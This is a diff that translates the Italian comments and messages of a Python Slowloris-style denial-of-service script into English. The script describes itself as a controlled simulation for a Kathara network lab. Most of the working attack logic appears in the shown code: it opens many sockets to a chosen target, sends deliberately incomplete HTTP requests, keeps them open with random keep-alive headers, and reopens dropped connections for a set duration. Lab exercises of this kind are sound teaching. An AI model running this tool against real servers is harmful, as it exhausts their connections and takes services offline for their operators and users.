@@ -8,15 +8,15 @@ import random
 
 def create_slow_socket(target_host, target_port, timeout=4):
     """
-    Apre una connessione TCP e invia una richiesta HTTP incompleta.
-    La connessione viene lasciata aperta.
+    Opens a TCP connection and sends an incomplete HTTP request.
+    The connection remains open.
     """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(timeout)
 
     s.connect((target_host, target_port))
 
-    # Richiesta HTTP volutamente incompleta: non viene inviato il doppio CRLF finale
+    # Intentionally incomplete HTTP request: the final double CRLF is not sent.
     request = (
         f"GET / HTTP/1.1\r\n"
         f"Host: {target_host}\r\n"
@@ -31,8 +31,8 @@ def create_slow_socket(target_host, target_port, timeout=4):
 
 def keep_socket_alive(sock, target_host):
     """
-    Invia periodicamente piccoli header fittizi per evitare che il server chiuda
-    la connessione per inattività.
+    Periodically sends small dummy headers to keep the server from closing the
+    connection due to inactivity.
     """
     header = f"X-Keep-Alive-{random.randint(1, 999999)}: {random.randint(1, 999999)}\r\n"
     sock.sendall(header.encode())
@@ -43,26 +43,26 @@ def slow_attack(target_host, target_port, connections, interval, duration):
     start_time = time.time()
 
     print(f"[+] Target: {target_host}:{target_port}")
-    print(f"[+] Connessioni richieste: {connections}")
-    print(f"[+] Intervallo keep-alive: {interval} secondi")
-    print(f"[+] Durata: {duration} secondi")
-    print("[+] Avvio simulazione slow connection exhaustion")
+    print(f"[+] Requested connections: {connections}")
+    print(f"[+] Keep-alive interval: {interval} seconds")
+    print(f"[+] Duration: {duration} seconds")
+    print("[+] Starting slow connection exhaustion simulation")
 
-    # Fase 1: apertura delle connessioni
+    # Phase 1: open connections.
     for i in range(connections):
         try:
             s = create_slow_socket(target_host, target_port)
             sockets.append(s)
-            print(f"[+] Connessione aperta: {i + 1}/{connections}")
+            print(f"[+] Connection opened: {i + 1}/{connections}")
         except Exception as e:
-            print(f"[-] Connessione fallita {i + 1}/{connections}: {e}")
+            print(f"[-] Connection failed {i + 1}/{connections}: {e}")
 
-        # Piccola pausa per evitare burst troppo aggressivi
+        # Small pause to avoid overly aggressive bursts.
         time.sleep(0.05)
 
-    print(f"[+] Connessioni effettivamente aperte: {len(sockets)}")
+    print(f"[+] Connections actually opened: {len(sockets)}")
 
-    # Fase 2: mantenimento delle connessioni
+    # Phase 2: maintain connections.
     while time.time() - start_time < duration:
         alive_sockets = []
 
@@ -78,9 +78,9 @@ def slow_attack(target_host, target_port, connections, interval, duration):
 
         sockets = alive_sockets
 
-        print(f"[*] Connessioni ancora attive: {len(sockets)}")
+        print(f"[*] Connections still active: {len(sockets)}")
 
-        # Se troppe connessioni sono cadute, prova a ricrearle
+        # Recreate connections if too many have been dropped.
         missing = connections - len(sockets)
 
         for _ in range(missing):
@@ -92,8 +92,8 @@ def slow_attack(target_host, target_port, connections, interval, duration):
 
         time.sleep(interval)
 
-    # Fase 3: chiusura ordinata
-    print("[+] Fine simulazione. Chiusura socket.")
+    # Phase 3: orderly shutdown.
+    print("[+] Simulation complete. Closing sockets.")
 
     for s in sockets:
         try:
@@ -101,19 +101,19 @@ def slow_attack(target_host, target_port, connections, interval, duration):
         except Exception:
             pass
 
-    print("[+] Completato.")
+    print("[+] Complete.")
 
 
 def main():
     parser = argparse.ArgumentParser(
-        description="Simulazione controllata di slow connection exhaustion per laboratorio Kathara"
+        description="Controlled slow connection exhaustion simulation for a Kathara lab"
     )
 
-    parser.add_argument("target_host", help="IP o hostname del server vittima")
-    parser.add_argument("target_port", type=int, help="Porta del servizio HTTP/TCP")
-    parser.add_argument("-c", "--connections", type=int, default=100, help="Numero di connessioni simultanee")
-    parser.add_argument("-i", "--interval", type=int, default=10, help="Intervallo tra keep-alive, in secondi")
-    parser.add_argument("-d", "--duration", type=int, default=60, help="Durata totale dell'attacco, in secondi")
+    parser.add_argument("target_host", help="Target server IP address or hostname")
+    parser.add_argument("target_port", type=int, help="HTTP/TCP service port")
+    parser.add_argument("-c", "--connections", type=int, default=100, help="Number of simultaneous connections")
+    parser.add_argument("-i", "--interval", type=int, default=10, help="Keep-alive interval in seconds")
+    parser.add_argument("-d", "--duration", type=int, default=60, help="Total attack duration in seconds")
 
     args = parser.parse_args()
 
